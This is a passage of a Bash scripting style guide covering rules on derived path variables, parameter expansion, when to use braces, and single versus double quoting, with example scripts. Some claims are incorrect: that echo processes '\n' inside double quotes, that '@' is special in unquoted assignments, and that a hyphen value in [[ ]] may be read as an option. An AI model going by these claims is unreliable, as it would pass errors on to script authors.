    # Install binary
    debug "Installing binary to: $MAIN_BINARY"
    install -m 755 "$SCRIPT_DIR/bin/$APP_NAME" "$MAIN_BINARY"

    # Install config
    if [[ ! -f "$CONFIG_FILE" ]]; then
      debug "Installing config to: $CONFIG_FILE"
      install -m 644 "$SCRIPT_DIR/config/config.conf" "$CONFIG_FILE"
    else
      debug "Config exists, skipping: $CONFIG_FILE"
    fi

    # Install systemd service
    debug "Installing service to: $SERVICE_FILE"
    install -m 644 "$SCRIPT_DIR/systemd/$APP_NAME.service" "$SERVICE_FILE"

    success 'Files installed successfully'
  fi
}

# ============================================================================
# Main Function
# ============================================================================

usage() {
  cat <<'EOF'
Usage: install.sh [OPTIONS]

Install myapp with configurable paths.

Options:
  -v, --verbose           Verbose output
  -vv                     Very verbose (debug) output
  -n, --dry-run           Dry-run mode (show what would be done)
  --prefix PREFIX         Installation prefix (default: /usr/local)
  --app-name NAME         Application name (default: myapp)
  --system-user USER      System user (default: myapp)
  -h, --help              Show this help message
  -V, --version           Show version

Examples:
  install.sh
  install.sh --prefix /opt/myapp
  install.sh --dry-run --verbose
  install.sh --prefix /usr --system-user webapp
EOF
}

main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE=1
        ;;

      -vv)
        VERBOSE=2
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      --prefix)
        noarg "$@"
        shift
        PREFIX="$1"
        # Update all derived paths when PREFIX changes
        update_derived_paths
        ;;

      --app-name)
        noarg "$@"
        shift
        APP_NAME="$1"
        # Update paths that depend on APP_NAME
        update_derived_paths
        ;;

      --system-user)
        noarg "$@"
        shift
        SYSTEM_USER="$1"
        ;;

      -V|--version)
        echo "$SCRIPT_NAME $VERSION"
        return 0
        ;;

      -h|--help)
        usage
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option: $1"
        ;;

      *)
        die 22 "Unexpected argument: $1"
        ;;
    esac
    shift
  done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN PREFIX APP_NAME SYSTEM_USER
  readonly -- BIN_DIR LIB_DIR SHARE_DIR MAN_DIR DOC_DIR
  readonly -- CONFIG_DIR LOG_DIR DATA_DIR RUN_DIR SYSTEMD_DIR
  readonly -- MAIN_BINARY CONFIG_FILE LOG_FILE PID_FILE SERVICE_FILE

  # Check for root if not dry-run
  if ((DRY_RUN == 0)) && [[ "$EUID" -ne 0 ]]; then
    die 1 'This script must be run as root (or use --dry-run to preview)'
  fi

  # Show configuration
  show_config

  # Create directories
  info 'Creating directories...'
  create_directories

  # Install files
  install_files

  # Success
  ((DRY_RUN)) && info '[DRY-RUN] Installation preview complete'
  ((DRY_RUN)) || success "$APP_NAME v$VERSION installed successfully!"
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - duplicating values instead of deriving
PREFIX='/usr/local'
BIN_DIR='/usr/local/bin'        # Duplicates PREFIX!
LIB_DIR='/usr/local/lib'        # Duplicates PREFIX!

# ✓ Correct - derive from base value
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"           # Derived from PREFIX
LIB_DIR="$PREFIX/lib"           # Derived from PREFIX

# ✗ Wrong - not updating derived variables when base changes
main() {
  case $1 in
    --prefix)
      shift
      PREFIX="$1"
      # BIN_DIR and LIB_DIR are now wrong!
      ;;
  esac
}

# ✓ Correct - update derived variables
main() {
  case $1 in
    --prefix)
      shift
      PREFIX="$1"
      BIN_DIR="$PREFIX/bin"     # Update derived
      LIB_DIR="$PREFIX/lib"     # Update derived
      ;;
  esac
}

# ✗ Wrong - no comments explaining derivation
CONFIG_DIR="$HOME/.config/$APP_NAME"
DATA_DIR="$HOME/.local/share/$APP_NAME"
CACHE_DIR="$HOME/.cache/$APP_NAME"

# ✓ Correct - section comment explaining derivation
# Derived from $HOME and $APP_NAME
CONFIG_DIR="$HOME/.config/$APP_NAME"
DATA_DIR="$HOME/.local/share/$APP_NAME"
CACHE_DIR="$HOME/.cache/$APP_NAME"

# ✗ Wrong - making derived variables readonly before base
BIN_DIR="$PREFIX/bin"
readonly -- BIN_DIR             # Can't update if PREFIX changes!
PREFIX='/usr/local'

# ✓ Correct - make readonly after all values set
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"
# Parse arguments that might change PREFIX...
readonly -- PREFIX BIN_DIR      # Now make readonly

# ✗ Wrong - complex derivation without comments
DEPLOYMENT="$ENV-$REGION-$APP-$VERSION-$COMMIT"

# ✓ Correct - explain complex derivation
# Deployment ID format: environment-region-app-version-commit
DEPLOYMENT="$ENV-$REGION-$APP-$VERSION-$COMMIT"

# ✗ Wrong - inconsistent derivation
CONFIG_DIR='/etc/myapp'                  # Hardcoded
LOG_DIR="/var/log/$APP_NAME"             # Derived from APP_NAME
# Inconsistent - either both derived or both hardcoded!

# ✓ Correct - consistent derivation
CONFIG_DIR="/etc/$APP_NAME"              # Derived
LOG_DIR="/var/log/$APP_NAME"             # Derived

# ✗ Wrong - circular dependency
VAR1="$VAR2"
VAR2="$VAR1"                             # Circular!

# ✓ Correct - clear dependency chain
BASE='value'
DERIVED1="$BASE/path1"
DERIVED2="$BASE/path2"

# ✗ Wrong - hardcoding derived value that should be flexible
APP_NAME='myapp'
CONFIG_FILE='/etc/myapp/config.conf'     # Hardcoded!

# ✓ Correct - derive from APP_NAME
APP_NAME='myapp'
CONFIG_DIR="/etc/$APP_NAME"
CONFIG_FILE="$CONFIG_DIR/config.conf"    # Derived
```

**Edge cases:**

**1. Environment variable fallbacks:**

```bash
# XDG Base Directory support with fallbacks
CONFIG_BASE="${XDG_CONFIG_HOME:-$HOME/.config}"
DATA_BASE="${XDG_DATA_HOME:-$HOME/.local/share}"
CACHE_BASE="${XDG_CACHE_HOME:-$HOME/.cache}"
STATE_BASE="${XDG_STATE_HOME:-$HOME/.local/state}"

# Derived from environment-aware bases
CONFIG_DIR="$CONFIG_BASE/$APP_NAME"
DATA_DIR="$DATA_BASE/$APP_NAME"
CACHE_DIR="$CACHE_BASE/$APP_NAME"
LOG_DIR="$STATE_BASE/$APP_NAME"
```

**2. Conditional derivation:**

```bash
# Different paths for development vs production
if [[ "$ENVIRONMENT" == 'development' ]]; then
  CONFIG_DIR="$SCRIPT_DIR/config"
  LOG_DIR="$SCRIPT_DIR/logs"
else
  CONFIG_DIR="/etc/$APP_NAME"
  LOG_DIR="/var/log/$APP_NAME"
fi

# Derived from environment-specific directories
CONFIG_FILE="$CONFIG_DIR/config.conf"
LOG_FILE="$LOG_DIR/app.log"
```

**3. Platform-specific derivations:**

```bash
# Detect platform
case "$(uname -s)" in
  Darwin)
    LIB_EXT='dylib'
    CONFIG_DIR="$HOME/Library/Application Support/$APP_NAME"
    ;;
  Linux)
    LIB_EXT='so'
    CONFIG_DIR="$HOME/.config/$APP_NAME"
    ;;
  *)
    die 1 'Unsupported platform'
    ;;
esac

# Derived from platform-specific values
LIBRARY_NAME="lib$APP_NAME.$LIB_EXT"
CONFIG_FILE="$CONFIG_DIR/config.conf"
```

**4. Hardcoded exceptions:**

```bash
# Most paths derived from PREFIX
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"
LIB_DIR="$PREFIX/lib"

# Exception: System-wide profile must be in /etc regardless of PREFIX
# Reason: Shell initialization requires fixed path for all users
PROFILE_DIR='/etc/profile.d'           # Hardcoded by design
PROFILE_FILE="$PROFILE_DIR/$APP_NAME.sh"
```

**5. Multiple update functions:**

```bash
# Update subset of derived variables
update_prefix_paths() {
  BIN_DIR="$PREFIX/bin"
  LIB_DIR="$PREFIX/lib"
  SHARE_DIR="$PREFIX/share"
}

update_app_paths() {
  CONFIG_DIR="/etc/$APP_NAME"
  LOG_DIR="/var/log/$APP_NAME"
  DATA_DIR="/var/lib/$APP_NAME"
}

update_all_derived() {
  update_prefix_paths
  update_app_paths

  # Files derived from directories
  CONFIG_FILE="$CONFIG_DIR/config.conf"
  LOG_FILE="$LOG_DIR/app.log"
}
```

**Summary:**

- **Group derived variables** - with section comments explaining dependencies
- **Derive from base values** - never duplicate, always compute
- **Update when base changes** - especially during argument parsing
- **Document special cases** - explain hardcoded values that don't derive
- **Consistent derivation** - if one path derives from APP_NAME, all should
- **Environment fallbacks** - use `${XDG_VAR:-$HOME/default}` pattern
- **Make readonly last** - after all parsing and derivation complete
- **Clear dependency chain** - base → derived1 → derived2
- **Section comments** - "# Derived from PREFIX" or "# Derived paths"
- **Update functions** - centralize derivation logic when many variables

**Key principle:** Derived variables implement the DRY (Don't Repeat Yourself) principle at the configuration level. Define each piece of information once (the base value), then derive everything else from it. This ensures consistency when base values change and makes scripts more maintainable. Always group derived variables with explanatory comments, and remember to update them when base variables change during execution. The mental model is simple: base values are inputs, derived variables are computed outputs.


---


**Rule: BCS0301**

### Parameter Expansion
```bash
SCRIPT_NAME=${SCRIPT_PATH##*/} # Remove longest prefix pattern
SCRIPT_DIR=${SCRIPT_PATH%/*}   # Remove shortest suffix pattern
${var:-default}                # Default value
${var:0:1}                     # Substring
${#array[@]}                   # Array length
${var,,}                       # Lowercase conversion
"${@:2}"                       # All args starting from 2nd
```


---


**Rule: BCS0302**

### Variable Expansion Guidelines

**General Rule:** Always quote variables with `"$var"` as the default form. Only use braces `"${var}"` when syntactically necessary.

**Rationale:** Braces add visual noise without providing value when not required. Using them only when necessary makes code cleaner and the necessary cases stand out.

#### When Braces Are REQUIRED

1. **Parameter expansion operations:**
   ```bash
   "${var##*/}"      # Remove longest prefix pattern
   "${var%/*}"       # Remove shortest suffix pattern
   "${var:-default}" # Default value
   "${var:0:5}"      # Substring
   "${var//old/new}" # Pattern substitution
   "${var,,}"        # Case conversion
   ```

2. **Variable concatenation (no separator):**
   ```bash
   "${var1}${var2}${var3}"  # Multiple variables joined
   "${prefix}suffix"        # Variable immediately followed by alphanumeric
   ```

3. **Array access:**
   ```bash
   "${array[index]}"         # Array element access
   "${array[@]}"             # All array elements
   "${#array[@]}"            # Array length
   ```

4. **Special parameter expansion:**
   ```bash
   "${@:2}"                  # Positional parameters starting from 2nd
   "${10}"                   # Positional parameters beyond $9
   "${!var}"                 # Indirect expansion
   ```

#### When Braces Are NOT Required

**Default form for standalone variables:**
```bash
# ✓ Correct - use simple form
"$var"
"$HOME"
"$SCRIPT_DIR"
"$1" "$2" ... "$9"

# ✗ Wrong - unnecessary braces
"${var}"                    # ✗ Don't do this
"${HOME}"                   # ✗ Don't do this
"${SCRIPT_DIR}"             # ✗ Don't do this
```

**Path concatenation with separators:**
```bash
# ✓ Correct - quotes handle the concatenation
"$PREFIX"/bin               # When separate arguments
"$PREFIX/bin"               # When single string
"$SCRIPT_DIR"/build/lib/file.so

# ✗ Wrong - unnecessary braces
"${PREFIX}"/bin             # ✗ Unnecessary
"${PREFIX}/bin"             # ✗ Unnecessary
"${SCRIPT_DIR}"/build/lib   # ✗ Unnecessary
```

**Note:** The pattern `"$var"/literal/"$var"` (mixing quoted variables with unquoted literals/separators) is acceptable and preferred in assignments, conditionals, and command arguments. The quotes protect the variables while separators (/, -, ., etc.) naturally delimit without requiring quotes:

```bash
# All acceptable forms
result="$path"/file.txt
config="$HOME"/.config/"$APP"/settings
[[ -f "$dir"/subdir/file ]]
echo "$path"/build/output
```

**Variable usage in strings:**
```bash
# ✓ Correct
echo "Installing to $PREFIX/bin"
info "Found $count files"
"$VAR/path" "in command arguments"

# ✗ Wrong - unnecessary braces
echo "Installing to ${PREFIX}/bin"  # ✗ Slash separates, braces not needed
info "Found ${count} files"         # ✗ Space separates, braces not needed
"${VAR}/path"                       # ✗ Slash separates, braces not needed
```

**In conditionals:**
```bash
# ✓ Correct
[[ -d "$path" ]]
[[ -f "$SCRIPT_DIR"/file ]]
if [[ "$var" == 'value' ]]; then

# ✗ Wrong
[[ -d "${path}" ]]          # ✗ Unnecessary
[[ -f "${SCRIPT_DIR}"/file ]] # ✗ Unnecessary
```

#### Edge Cases and Special Situations

**When next character is alphanumeric AND no separator:**
```bash
# Braces required - ambiguous without them
"${var}_suffix"             # ✓ Correct - prevents $var_suffix interpretation
"${prefix}123"              # ✓ Correct - prevents $prefix123 interpretation

# No braces needed - separator present
"$var-suffix"               # ✓ Correct - dash is separator
"$var.suffix"               # ✓ Correct - dot is separator
"$var/path"                 # ✓ Correct - slash is separator
```

**Multiple variables in echo/info commands:**
```bash
# ✓ Correct - no braces needed in strings
echo "Binary: $BIN_DIR/file"
echo "Version $VERSION installed to $PREFIX"
info "Processing $count items from $source_dir"

# ✗ Wrong - unnecessary braces
echo "Binary: ${BIN_DIR}/file" # ✗ Unnecessary
echo "Version ${VERSION} installed to ${PREFIX}"  # ✗ Unnecessary
```

#### Summary Table

| Situation | Form | Example |
|-----------|------|---------|
| Standalone variable | `"$var"` | `"$HOME"` |
| Path with separator | `"$var"/path` or `"$var/path"` | `"$BIN_DIR"/file` |
| Parameter expansion | `"${var%pattern}"` | `"${path%/*}"` |
| Concatenation (no separator) | `"${var1}${var2}"` | `"${prefix}${suffix}"` |
| Array access | `"${array[i]}"` | `"${args[@]}"` |
| In echo/info strings | `"$var"` | `echo "File: $path"` |
| Conditionals | `"$var"` | `[[ -f "$file" ]]` |

**Key Principle:** Use `"$var"` by default. Only add braces when the shell requires them for correct parsing.


---


**Rule: BCS0401**

### Static Strings and Constants

**Always use single quotes for string literals that contain no variables:**

```bash
# Message functions - single quotes for static strings
info 'Checking prerequisites...'
success 'Prerequisites check passed'
warn 'bash-builtins package not found'
error 'Failed to install package'

# Variable assignments
SCRIPT_DESC='Mail Tools Installation Script'
DEFAULT_PATH='/usr/local/bin'
MESSAGE='Operation completed successfully'

# Conditionals with static strings
[[ "$status" == 'success' ]]     # ✓ Correct
[[ "$status" == "success" ]]     # ✗ Unnecessary double quotes
```

**Rationale:**

1. **Performance**: Single quotes are slightly faster (no parsing for variables/escapes)
2. **Clarity**: Signals to reader "this is a literal string, no substitution"
3. **Safety**: Prevents accidental variable expansion or command substitution
4. **Predictability**: What you see is exactly what you get (WYSIWYG)
5. **Escaping**: No need to escape special characters like `$`, `` ` ``, `\`, `!`

**When single quotes are required:**

```bash
# Strings with special characters
msg='The variable $PATH will not expand here'
cmd='This `command` will not execute'
note='Backslashes \ do not escape anything in single quotes'

# SQL queries and regex patterns
sql='SELECT * FROM users WHERE name = "John"'
regex='^\$[0-9]+\.[0-9]{2}$'  # Matches $12.34

# Shell commands stored as strings
find_cmd='find /tmp -name "*.log" -mtime +7 -delete'
```

**When double quotes are needed instead:**

```bash
# When variables must be expanded
info "Found $count files in $directory"
echo "Current user: $USER"
warn "File $filename does not exist"

# When command substitution is needed
msg="Current time: $(date +%H:%M:%S)"
info "Script running as $(whoami)"

# When escape sequences are needed
echo "Line 1\nLine 2"  # \n processed in double quotes
tab="Column1\tColumn2"  # \t processed in double quotes
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - double quotes for static strings
info "Checking prerequisites..."  # No variables, use single quotes
error "Failed to connect"          # No variables, use single quotes
[[ "$status" == "active" ]]        # Right side should be single-quoted

# ✓ Correct - single quotes for static content
info 'Checking prerequisites...'
error 'Failed to connect'
[[ "$status" == 'active' ]]

# ✗ Wrong - unnecessary escaping in double quotes
msg="The cost is \$5.00"           # Must escape $
path="C:\\Users\\John"             # Must escape backslashes

# ✓ Correct - no escaping needed in single quotes
msg='The cost is $5.00'
path='C:\Users\John'

# ✗ Wrong - trying to use variables in single quotes
name='John'
greeting='Hello, $name'  # ✗ $name not expanded, greeting = "Hello, $name"

# ✓ Correct - use double quotes when variables needed
name='John'
greeting="Hello, $name"  # ✓ greeting = "Hello, John"
```

**Combining single and double quotes:**

```bash
# When you need both variable expansion and literal single quotes
msg="It's $count o'clock"  # ✓ Works - single quote inside double quotes

# When you need both static text and variables
echo 'Static text: ' "$variable" ' more static'

# Or use double quotes for everything when mixing
echo "Static text: $variable more static"
```

**Special case - empty strings:**

```bash
# Both are equivalent for empty strings, but single quotes are preferred
var=''   # ✓ Preferred
var=""   # ✓ Also acceptable

# For consistency, use single quotes
DEFAULT_VALUE=''
EMPTY_STRING=''
```

**Summary rule:**
- **Single quotes `'...'`**: For all static strings (no variables, no escapes)
- **Double quotes `"..."`**: When you need variable expansion or command substitution
- **Consistency**: Using single quotes consistently for static strings makes the code more scannable - when you see double quotes, you know to look for variables or substitutions


---


**Rule: BCS0402**

### Exception: One-Word Literals

**Literal one-word values containing only safe characters (alphanumeric, underscore, hyphen, dot, or slash) may be left unquoted in variable assignments and simple conditionals. However, using quotes is more defensive, consistent, and recommended for all but the simplest cases. This exception exists to acknowledge common practice, but when in doubt, quote everything.**

**Rationale:**

- **Common Practice**: Unquoted one-word literals are widely used in shell scripts
- **Readability**: Less visual noise for simple literal values
- **Historical Precedent**: Long-standing shell scripting convention
- **Safety Threshold**: Only truly safe when value contains no special characters
- **Defensive Programming**: Quoting is safer - prevents future bugs if value changes
- **Consistency**: Always quoting eliminates mental overhead of "should I quote this?"
- **Team Preference**: Choice between brevity and defensive programming

**What qualifies as a one-word literal:**

A one-word literal is a value that:
- Contains **only** alphanumeric characters (`a-zA-Z0-9`)
- May include underscores (`_`), hyphens (`-`), dots (`.`), forward slashes (`/`)
- Does **not** contain spaces, tabs, or newlines
- Does **not** contain shell special characters: `*`, `?`, `[`, `]`, `{`, `}`, `$`, `` ` ``, `"`, `'`, `\`, `;`, `&`, `|`, `<`, `>`, `(`, `)`, `!`, `#`
- Does **not** start with a hyphen (in conditionals, could be mistaken for option)

**Examples of one-word literals:**

```bash
# ✓ Safe to leave unquoted (but quoting is better)
ORGANIZATION=Okusi
LOG_LEVEL=INFO
STATUS=success
VERSION=1.0.0
PATH_SUFFIX=/usr/local
FILE_EXT=.tmp
FLAG=true
COUNT=42

# ✗ Must be quoted (contain special characters or spaces)
MESSAGE='Hello world'           # Contains space
ERROR='File not found'          # Contains spaces
PATTERN='*.txt'                 # Contains wildcard
COMMAND='ls -la'                # Contains space
EMAIL='user@domain.com'         # Contains @
NAME='O'\''Reilly'              # Contains apostrophe
```

**Variable assignments:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ Acceptable - one-word literals unquoted
declare -- ORGANIZATION=Okusi
declare -- LOG_LEVEL=INFO
declare -- DEFAULT_PATH=/usr/local/bin
declare -- FILE_EXT=.tmp

# ✓ Better - always quote (defensive programming)
declare -- ORGANIZATION='Okusi'
declare -- LOG_LEVEL='INFO'
declare -- DEFAULT_PATH='/usr/local/bin'
declare -- FILE_EXT='.tmp'

# ✓ MANDATORY - quote multi-word or special values
declare -- APP_NAME='My Application'
declare -- ERROR_MSG='File not found'
declare -- PATTERN='*.log'
declare -- EMAIL='admin@example.com'

# ✗ Wrong - special characters unquoted
declare -- EMAIL=admin@example.com      # @ is special!
declare -- PATTERN=*.log                 # * will glob!
declare -- MESSAGE=Hello world           # Syntax error!

#fin
```

**Conditionals:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -- status='success'
declare -- level='INFO'
declare -- organization='Okusi'

# ✓ Acceptable - one-word literal values unquoted
[[ "$status" == success ]]
[[ "$level" == INFO ]]
[[ "$organization" == Okusi ]]

# ✓ Better - always quote (more consistent)
[[ "$status" == 'success' ]]
[[ "$level" == 'INFO' ]]
[[ "$organization" == 'Okusi' ]]

# ✓ MANDATORY - quote multi-word values
[[ "$message" == 'File not found' ]]
[[ "$pattern" == '*.txt' ]]

# ✗ Wrong - multi-word unquoted
[[ "$message" == File not found ]]      # Syntax error!
[[ "$pattern" == *.txt ]]                # Glob expansion!

# Note: ALWAYS quote the variable being tested
[[ "$status" == success ]]     # ✓ Variable quoted
[[ $status == success ]]       # ✗ Variable unquoted - dangerous!

#fin
```

**Case statement patterns:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ Acceptable - case patterns can be unquoted literals
handle_action() {
  local -- action="$1"

  case "$action" in
    start) start_service ;;      # ✓ One-word literal
    stop) stop_service ;;        # ✓ One-word literal
    restart) restart_service ;;  # ✓ One-word literal
    *) die 22 "Invalid action: $action" ;;
  esac
}

# ✓ Also correct - quote for consistency
handle_action_quoted() {
  local -- action="$1"

  case "$action" in
    'start') start_service ;;
    'stop') stop_service ;;
    'restart') restart_service ;;
    *) die 22 "Invalid action: $action" ;;
  esac
}

# ✓ MANDATORY - quote patterns with special characters
handle_email() {
  local -- email="$1"

  case "$email" in
    'admin@example.com') echo 'Admin user' ;;    # Must quote @
    'user@example.com') echo 'Regular user' ;;   # Must quote @
    *) echo 'Unknown user' ;;
  esac
}

main() {
  handle_action 'start'
  handle_email 'admin@example.com'
}

main "$@"

#fin
```

**Path construction:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ Acceptable - literal path segments unquoted
declare -- temp_file="$PWD"/.foobar.tmp
declare -- config_dir="$HOME"/.config/myapp
declare -- backup="$filename".bak
declare -- log_path=/var/log/myapp.log

# ✓ Better - quote for consistency (recommended)
declare -- temp_file="$PWD/.foobar.tmp"
declare -- config_dir="$HOME/.config/myapp"
declare -- backup="$filename.bak"
declare -- log_path='/var/log/myapp.log'

# ✓ MANDATORY - quote paths with spaces
declare -- docs_dir="$HOME/My Documents"
declare -- app_path='/Applications/My App.app'

# ✗ Wrong - unquoted paths with spaces
declare -- docs_dir=$HOME/My Documents     # Word splitting!
declare -- app_path=/Applications/My App.app  # Syntax error!

#fin
```

**Complete example - Configuration script:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Configuration - Mix of quoted and unquoted
# ============================================================================

# Simple one-word values - technically could be unquoted
declare -- APP_NAME='MyApp'           # Single word, but quote for safety
declare -- ENVIRONMENT='production'   # Single word
declare -- LOG_LEVEL='INFO'           # Single word

# Values that MUST be quoted
declare -- DISPLAY_NAME='My Application'  # Contains space
declare -- COPYRIGHT='Copyright © 2025'   # Contains ©
declare -- ERROR_MSG='Operation failed'   # Contains space

# Paths - quote for safety
declare -- CONFIG_DIR='/etc/myapp'
declare -- LOG_DIR='/var/log/myapp'
declare -- DATA_DIR='/var/lib/myapp'

# Derived paths
declare -- CONFIG_FILE="$CONFIG_DIR/config.conf"
declare -- LOG_FILE="$LOG_DIR/app.log"
declare -- PID_FILE='/var/run/myapp.pid'

readonly -- APP_NAME ENVIRONMENT LOG_LEVEL DISPLAY_NAME COPYRIGHT ERROR_MSG
readonly -- CONFIG_DIR LOG_DIR DATA_DIR CONFIG_FILE LOG_FILE PID_FILE

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ⚠" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }

die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ============================================================================
# Validation Functions
# ============================================================================

# Validate environment - one-word literals in conditionals
validate_environment() {
  local -- env="$1"

  # ✓ Acceptable - one-word literals unquoted in pattern
  case "$env" in
    development|staging|production)
      success "Valid environment: $env"
      return 0
      ;;

    *)
      error "Invalid environment: $env"
      error 'Valid: development, staging, production'
      return 1
      ;;
  esac
}

# Validate log level
validate_log_level() {
  local -- level="$1"

  # ✓ Acceptable - one-word comparisons
  if [[ "$level" == DEBUG || "$level" == INFO || "$level" == WARN || "$level" == ERROR ]]; then
    success "Valid log level: $level"
    return 0
  else
    error "Invalid log level: $level"
    error 'Valid: DEBUG, INFO, WARN, ERROR'
    return 1
  fi
}

# ============================================================================
# Configuration Functions
# ============================================================================

# Display configuration
show_config() {
  info "$APP_NAME Configuration:"
  info "  Display Name: $DISPLAY_NAME"
  info "  Environment: $ENVIRONMENT"
  info "  Log Level: $LOG_LEVEL"
  info "  Config File: $CONFIG_FILE"
  info "  Log File: $LOG_FILE"
  info "  Data Directory: $DATA_DIR"
}

# Validate directories exist
check_directories() {
  local -a required_dirs=(
    "$CONFIG_DIR"
    "$LOG_DIR"
    "$DATA_DIR"
  )

  local -- dir
  local -i missing=0

  for dir in "${required_dirs[@]}"; do
    if [[ ! -d "$dir" ]]; then
      error "Directory not found: $dir"
      ((missing+=1))
    fi
  done

  ((missing == 0))
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  info "$DISPLAY_NAME v$VERSION"
  info "$COPYRIGHT"
  echo ''

  # Validate environment
  if ! validate_environment "$ENVIRONMENT"; then
    die 1 'Invalid environment configuration'
  fi

  # Validate log level
  if ! validate_log_level "$LOG_LEVEL"; then
    die 1 'Invalid log level configuration'
  fi

  # Show configuration
  show_config
  echo ''

  # Check directories
  if ! check_directories; then
    die 1 'Required directories missing'
  fi

  success 'Configuration valid'
}

main "$@"

#fin
```

**When quotes are mandatory:**

```bash
# ✗ NEVER unquote these:

# 1. Values with spaces
MESSAGE=Hello world                 # Syntax error!
MESSAGE='Hello world'               # ✓ Correct

# 2. Values with wildcards
PATTERN=*.txt                       # Glob expansion!
PATTERN='*.txt'                     # ✓ Correct

# 3. Values with special characters
EMAIL=user@domain.com               # @ is special!
EMAIL='user@domain.com'             # ✓ Correct

# 4. Empty strings
VALUE=                              # Unquoted empty
VALUE=''                            # ✓ Correct

# 5. Values starting with hyphen (in conditionals)
[[ "$arg" == -h ]]                  # Could be option!
[[ "$arg" == '-h' ]]                # ✓ Correct

# 6. Values with parentheses
FILE=test(1).txt                    # () are special!
FILE='test(1).txt'                  # ✓ Correct

# 7. Values with dollar signs
LITERAL='$100'                      # Contains $
# Note: Use single quotes to prevent expansion

# 8. Values with backslashes
PATH='C:\Users\Name'                # Contains \
# Note: Use single quotes to preserve backslashes

# 9. Values with quotes
MESSAGE='It'\''s working'           # Contains apostrophe
MESSAGE="He said \"hello\""         # Contains quotes

# 10. Variable expansions (always quote)
FILE="$basename.txt"                # ✓ Variable quoted
BACKUP="$file.bak"                  # ✓ Variable quoted
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - unquoting values that need quotes

# Spaces
MESSAGE=File not found              # Syntax error!
MESSAGE='File not found'            # ✓ Correct

# Special characters
EMAIL=admin@example.com             # @ is special!
EMAIL='admin@example.com'           # ✓ Correct

# Wildcards
PATTERN=*.log                       # Glob expansion!
PATTERN='*.log'                     # ✓ Correct

# Empty values
VAR=                                # Confusing
VAR=''                              # ✓ Clear

# ✗ Wrong - inconsistent quoting
OPTION1=value1                      # Unquoted
OPTION2='value2'                    # Quoted
OPTION3=value3                      # Unquoted
# Pick one style and be consistent!

# ✓ Better - consistent quoting (recommended)
OPTION1='value1'
OPTION2='value2'
OPTION3='value3'

# ✗ Wrong - unquoted paths with spaces
DIR=/home/user/My Documents         # Word splitting!
DIR='/home/user/My Documents'       # ✓ Correct

# ✗ Wrong - unquoted variable concatenation
FILE=$basename.txt                  # Dangerous!
FILE="$basename.txt"                # ✓ Correct

# ✗ Wrong - unquoted in arrays
array=(one two three)               # Each becomes separate element
# This is actually correct for word splitting
# But if you meant literal "two three":
array=('one' 'two three')           # ✓ Correct

# ✗ Wrong - unquoted heredoc delimiter
cat <<EOF                           # Unquoted - variables expand
$VAR
EOF

cat <<'EOF'                         # ✓ Quoted - literal
$VAR
EOF

# ✗ Wrong - unquoted command substitution result
result=$(command)
echo $result                        # Word splitting!
echo "$result"                      # ✓ Correct
```

**Edge cases:**

**1. Numeric values:**

```bash
# Numbers are technically one-word literals
COUNT=42                # ✓ Acceptable (but quoting is safer)
COUNT='42'              # ✓ Better

# But for arithmetic, unquoted is standard
declare -i count=42     # ✓ Correct for integers
((count = 10))          # ✓ Correct in arithmetic context

# In conditionals, quote for consistency
[[ "$count" -eq 42 ]]   # ✓ Variable quoted
[[ "$count" -eq '42' ]] # ✓ Value quoted (pedantic)
```

**2. Boolean-style values:**

```bash
# true/false as strings
ENABLED=true            # ✓ Acceptable
ENABLED='true'          # ✓ Better

# Testing boolean values
[[ "$ENABLED" == true ]]    # ✓ Acceptable
[[ "$ENABLED" == 'true' ]]  # ✓ Better

# As integers (preferred for booleans)
declare -i ENABLED=1
((ENABLED)) && echo 'Enabled'
```

